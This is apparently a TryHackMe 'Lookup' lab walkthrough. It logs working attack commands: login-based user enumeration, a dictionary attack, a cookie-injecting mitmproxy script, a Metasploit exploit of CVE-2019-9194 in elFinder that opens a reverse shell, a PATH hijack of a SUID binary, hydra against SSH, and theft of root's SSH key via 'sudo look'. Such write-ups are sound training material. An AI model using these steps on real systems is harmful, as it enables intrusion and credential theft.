# Target
| Category          | Details                                                                                               |
|-------------------|-------------------------------------------------------------------------------------------------------|
| 📝 **Name**       | [Lookup](https://tryhackme.com/room/lookup)                                                           |  
| 🏷 **Type**       | THM Machine                                                                                           |
| 🖥 **OS**         | Linux                                                                                                 |
| 🎯 **Difficulty** | Easy                                                                                                  |
| 📁 **Tags**       | Web enumeration, mitmproxy, elFinder 2.1.47, CVE-2019-9194, Metasploit, PATH hijack, hydra, sudo look |

# Scan
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 80:42:78:04:f3:09:eb:c0:71:16:78:69:a2:b5:79:8f (RSA)
|   256 7c:c7:02:21:d3:ba:ba:b2:8b:db:45:4c:40:9c:81:21 (ECDSA)
|_  256 f6:02:0c:74:2c:4c:90:87:5a:1d:25:a3:42:67:54:a4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://lookup.thm
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Attack path
1. [Gain access to `files.lookup.thm` using credentials discovered during dictionary attack against `lookup.htm`](#gain-access-to-fileslookupthm-using-credentials-discovered-during-dictionary-attack-against-lookuphtm)
2. [Gain initial foothold by exploiting CVE-2019-9194 in `elFinder 2.1.47`](#gain-initial-foothold-by-exploiting-cve-2019-9194-in-elfinder-2147)
3. [Escalate to `think` user by discovering passwords stored in plaintext file in home directory](#escalate-to-think-user-by-discovering-passwords-stored-in-plaintext-file-in-home-directory)
4. [Escalate to `root` user by exfiltrating SSH private key accessed with `sudo look`](#escalate-to-root-user-by-exfiltrating-ssh-private-key-accessed-with-sudo-look)

### Gain access to `files.lookup.thm` using credentials discovered during dictionary attack against `lookup.htm`

#### Add `lookup.thm` to `/etc/hosts`
```
┌──(magicrc㉿perun)-[~/attack/THM Lookup]
└─$ echo "$TARGET lookup.thm" | sudo tee -a /etc/hosts
10.82.177.200 lookup.thm
```

#### Try to log in with random user and password
```
┌──(magicrc㉿perun)-[~/attack/THM Lookup]
└─$ curl http://lookup.thm/login.php -d 'username=user&password=pass'
Wrong username or password. Please try again.<br>Redirecting in 3 seconds.  
```

#### Try to log in as `admin` user
```
┌──(magicrc㉿perun)-[~/attack/THM Lookup]
└─$ curl http://lookup.thm/login.php -d 'username=admin&password=pass'
Wrong password. Please try again.<br>Redirecting in 3 seconds.
```
We can spot the difference in the error message, indicating that (most probably) `admin` user exists. We could use this to try to enumerate other users.

#### Enumerate users using bash script
```
┌──(magicrc㉿perun)-[~/attack/THM Lookup]
└─$ while read -r user_name; do \
    if ! curl -s http://lookup.thm/login.php -d "username=$user_name&password=pass" | grep -q 'Wrong username'
    then
        echo "[*] \033[43;31mFound $user_name\033[0m";
    fi
done < /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames-dup.txt
[*] Found admin
[*] Found jose
```

#### Conduct dictionary attack against `jose` user
Dictionary attack against `admin` user did not yield any (immediate) results.
```
user_name=jose
echo "[*] Executing dictionary attack against user \e[1;37m$user_name\e[0m..."
while read -r password; do \
    echo "[*] Checking: [\e[1;37m$password\e[0m"]
    if ! curl -s http://lookup.thm/login.php -d "username=$user_name&password=$password" | grep -q 'Please try again'
    then
        echo "[*] \033[43;31mFound $password\033[0m"; break
    fi
done < /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt
[*] Executing dictionary attack against user admin...
<SNIP>
[*] Found password123
```

#### Use discovered credentials to log in
```
┌──(magicrc㉿perun)-[~/attack/THM Lookup]
└─$ curl -v http://lookup.thm/login.php -d 'username=jose&password=password123'   
* Host lookup.thm:80 was resolved.
* IPv6: (none)
* IPv4: 10.82.177.200
*   Trying 10.82.177.200:80...
* Connected to lookup.thm (10.82.177.200) port 80
* using HTTP/1.x
> POST /login.php HTTP/1.1
> Host: lookup.thm
> User-Agent: curl/8.15.0
> Accept: */*
> Content-Length: 34
> Content-Type: application/x-www-form-urlencoded
> 
* upload completely sent off: 34 bytes
< HTTP/1.1 302 Found
< Date: Mon, 24 Nov 2025 23:10:30 GMT
< Server: Apache/2.4.41 (Ubuntu)
< Set-Cookie: login_status=success; expires=Tue, 25-Nov-2025 00:10:30 GMT; Max-Age=3600; path=/; domain=lookup.thm
< Location: http://files.lookup.thm
< Content-Length: 0
< Content-Type: text/html; charset=UTF-8
< 
* Connection #0 to host lookup.thm left intact
```
Upon successful login `login_status=success` cookie is being set and we are being redirected to `http://files.lookup.thm`. To 'bypass' login page (`http://lookup.thm/`) we could connect through proxy which will set this cookie each time.

#### Add `files.lookup.thm` to `/etc/hosts`
```
┌──(magicrc㉿perun)-[~/attack/THM Lookup]
└─$ echo "$TARGET files.lookup.thm" | sudo tee -a /etc/hosts
10.82.177.200 files.lookup.thm
```

#### Prepare `mitmproxy` script that will add `login_status=success` to each request
```
┌──(magicrc㉿perun)-[~/attack/THM Lookup]
└─$ cat <<'EOF'> add_cookie.py                                            
from mitmproxy import http

def request(flow: http.HTTPFlow) -> None:
    cookie = "login_status=success"

    if "Cookie" in flow.request.headers:
        flow.request.headers["Cookie"] += "; " + cookie
    else:
        flow.request.headers["Cookie"] = cookie
EOF
```

#### Start `mitmproxy` in headless mode in background
```
┌──(magicrc㉿perun)-[~/attack/THM Lookup]
└─$ mitmdump -s add_cookie.py --mode regular --listen-port 8888 &; export http_proxy=http://127.0.0.1:8888
[1] 271189
<SNIP>
[08:07:24.265] Loading script add_cookie.py
[08:07:24.266] HTTP(S) proxy listening at *:8888.
```

#### Connect to `http://files.lookup.thm` through proxy
```
┌──(magicrc㉿perun)-[~/attack/THM Lookup]
└─$ curl -sL http://files.lookup.thm -o /dev/null
[08:09:29.854][127.0.0.1:38804] client connect
[08:09:29.909][127.0.0.1:38804] server connect files.lookup.thm:80 (10.82.177.200:80)
127.0.0.1:38804: GET http://files.lookup.thm/
              << 302 Found 0b
127.0.0.1:38804: GET http://files.lookup.thm/elFinder/elfinder.html
              << 200 OK 3.4k
[08:09:30.015][127.0.0.1:38804] client disconnect
[08:09:30.015][127.0.0.1:38804] server disconnect files.lookup.thm:80 (10.82.177.200:80)
```

### Gain initial foothold by exploiting [CVE-2019-9194](https://nvd.nist.gov/vuln/detail/CVE-2019-9194) in `elFinder 2.1.47`

#### Enumerate `http://files.lookup.thm` to discover it's running `elFinder` in `2.1.47` version
```
┌──(magicrc㉿perun)-[~/attack/THM Lookup]
└─$ curl -s http://files.lookup.thm/elFinder/Changelog | head -n 3 
2019-02-25  Naoki Sawada  <hypweb+elfinder@gmail.com>

        * elFinder (2.1.47):
```

#### Run `exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection` in Metasploit
```
┌──(magicrc㉿perun)-[~/attack/THM Lookup]
└─$ msfconsole -q                                                                                                                     
msf > search elfinder

Matching Modules
================

   #  Name                                                               Disclosure Date  Rank       Check  Description
   -  ----                                                               ---------------  ----       -----  -----------
   0  exploit/multi/http/builderengine_upload_exec                       2016-09-18       excellent  Yes    BuilderEngine Arbitrary File Upload Vulnerability and execution
   1  exploit/unix/webapp/tikiwiki_upload_exec                           2016-07-11       excellent  Yes    Tiki Wiki Unauthenticated File Upload Vulnerability
   2  exploit/multi/http/wp_file_manager_rce                             2020-09-09       normal     Yes    WordPress File Manager Unauthenticated Remote Code Execution
   3  exploit/linux/http/elfinder_archive_cmd_injection                  2021-06-13       excellent  Yes    elFinder Archive Command Injection
   4  exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection  2019-02-26       excellent  Yes    elFinder PHP Connector exiftran Command Injection


Interact with a module by name or index. For example info 4, use 4 or use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection

msf > use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > show options 

Module options (exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, socks5h, http
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /elFinder/       yes       The base path to elFinder
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.94     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Auto



View the full module info with the info, or info -d command.

msf exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > set Proxies http:127.0.0.1:8888
Proxies => http:127.0.0.1:8888
msf exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > set ReverseAllowProxy true
ReverseAllowProxy => true
msf exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > set RHOSTS http://files.lookup.thm
RHOSTS => http://files.lookup.thm
msf exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > set LHOST tun0
LHOST => 192.168.132.170
msf exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > run
[*] Started reverse TCP handler on 192.168.132.170:4444 
[*] Uploading payload '4p8IR1G.jpg;echo 6370202e2e2f66696c65732f347038495231472e6a70672a6563686f2a202e7a4c5a3741514242582e706870 |xxd -r -p |sh& #.jpg' (1966 bytes)
[*] Triggering vulnerability via image rotation ...
[*] Executing payload (/elFinder/php/.zLZ7AQBBX.php) ...
[*] Sending stage (41224 bytes) to 10.82.177.200
[+] Deleted .zLZ7AQBBX.php
[*] Meterpreter session 1 opened (192.168.132.170:4444 -> 10.82.177.200:55962) at 2025-11-25 08:28:37 +0100
[*] No reply
[*] Removing uploaded file ...
[+] Deleted uploaded file

meterpreter > getuid
Server username: www-data
```

### Escalate to `think` user by discovering passwords stored in plaintext file in home directory

#### Stabilise shell
```
meterpreter > shell
Process 1107 created.
Channel 0 created.
/usr/bin/script -qc /bin/bash /dev/null
<var/www/files.lookup.thm/public_html/elFinder/php$ 
```

#### Discover unknown SUID binary
SUID binary has been found with `linpeas.sh`
```
<var/www/files.lookup.thm/public_html/elFinder/php$ ls -l /usr/sbin/pwm
ls -l /usr/sbin/pwm
-rwsr-sr-x 1 root root 17176 Jan 11  2024 /usr/sbin/pwm
<var/www/files.lookup.thm/public_html/elFinder/php$ /usr/sbin/pwm
/usr/sbin/pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: www-data
[-] File /home/www-data/.passwords not found
```
When running `/usr/sbin/pwm` we can see that it tries to read `/home/$USERNAME/.passwords` file. Such file could be actually found in `/home/think/`
```
<var/www/files.lookup.thm/public_html/elFinder/php$ ls -la /home/think/.passwords
<ic_html/elFinder/php$ ls -la /home/think/.passwords
-rw-r----- 1 root think 525 Jul 30  2023 /home/think/.passwords
```
`$USERNAME` is determined based on output of `id` command. We could try to hijack PATH to inject malicious version of `id` and in consequence read `/home/think/.passwords` file

#### Hijack PATH to use malicious version of `id`
```
<var/www/files.lookup.thm/public_html/elFinder/php$ echo 'echo "uid=33(think)"' > /tmp/id && \
chmod +x /tmp/id && \
PATH=/tmp:$PATH /usr/sbin/pwm | tail -n +3 > /tmp/think_passwords.txt
```

#### Use `/tmp/think_passwords.txt` to conduct dictionary attack against `think` user over SSH using `hydra`
```
┌──(magicrc㉿perun)-[~/attack/THM Lookup]
└─$ hydra -l think -P think_passwords.txt ssh://lookup.thm
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-25 09:27:44
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 49 login tries (l:1/p:49), ~4 tries per task
[DATA] attacking ssh://lookup.thm:22/
[22][ssh] host: lookup.thm   login: think   password: josemario.AKA(think)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-11-25 09:27:49
```

#### Confirm escalation with access over SSH
```
┌──(magicrc㉿perun)-[~/attack/THM Lookup]
└─$ ssh think@lookup.thm
think@lookup.thm's password: 
<SNIP>
think@ip-10-82-131-169:~$ id
uid=1000(think) gid=1000(think) groups=1000(think)
```

### Escalate to `root` user by exfiltrating SSH private key accessed with `sudo look`

#### List allowed sudo commands
```
think@ip-10-82-128-81:~$ sudo -l
[sudo] password for think: 
Matching Defaults entries for think on ip-10-82-128-81:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User think may run the following commands on ip-10-82-128-81:
    (ALL) /usr/bin/look
```

#### Use `sudo /usr/bin/look` to steal `root` SSH private key
```
think@ip-10-82-128-81:~$ sudo /usr/bin/look '' /root/.ssh/id_rsa > root_id_rsa
```

#### Exfiltrate `root_id_rsa` and use it access target as `root` over SSH
```
┌──(magicrc㉿perun)-[~/attack/THM Lookup]
└─$ scp think@lookup.thm:~/root_id_rsa . && chmod 600 root_id_rsa && ssh root@lookup.thm -i root_id_rsa
<SNIP>>
think@lookup.thm's password: 
root_id_rsa                                                                                                                                                       100% 2602    32.2KB/s   00:00    
<SNIP>
root@ip-10-82-128-81:~# id
uid=0(root) gid=0(root) groups=0(root)
```